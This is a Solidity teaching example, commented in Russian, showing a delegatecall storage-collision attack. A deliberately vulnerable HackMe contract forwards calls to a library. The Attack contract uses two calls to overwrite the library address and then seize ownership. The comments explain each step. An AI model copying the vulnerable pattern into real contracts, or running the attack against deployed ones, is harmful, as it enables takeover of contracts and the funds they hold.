// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
Это более сложная версия предыдущего эксплойта.

1. Алиса разворачивает Lib и HackMe с адресом Lib
2. Ева разворачивает Атаку с адресом HackMe
3. Ева вызывает Attack.attack()
4. Attack теперь является владельцем HackMe

Что случилось?
Обратите внимание, что переменные состояния не определены таким же образом в Lib.
и ХакМе. Это означает, что вызов Lib.doSomething() изменит первый
переменная состояния внутри HackMe, которая оказывается адресом lib.

Внутри Attack() первый вызов doSomething() изменяет адрес библиотеки.
хранить в HackMe. Адрес lib теперь установлен на Attack.
Второй вызов doSomething() вызывает Attack.doSomething(), и здесь мы
сменить владельца.
*/

contract Lib {
    uint public someNumber;

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    // Убедитесь, что расположение хранилища такое же, как у HackMe
     // Это позволит нам корректно обновлять переменные состояния
    address public lib;
    address public owner;
    uint public someNumber;

    HackMe public hackMe;

    constructor(HackMe _hackMe) {
        hackMe = HackMe(_hackMe);
    }

    function attack() public {
        // переопределить адрес библиотеки
        hackMe.doSomething(uint(uint160(address(this))));
        // передать любое число в качестве входных данных, функция doSomething() ниже будет называться
        hackMe.doSomething(1);
    }

    // сигнатура функции должна совпадать HackMe.doSomething()
    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}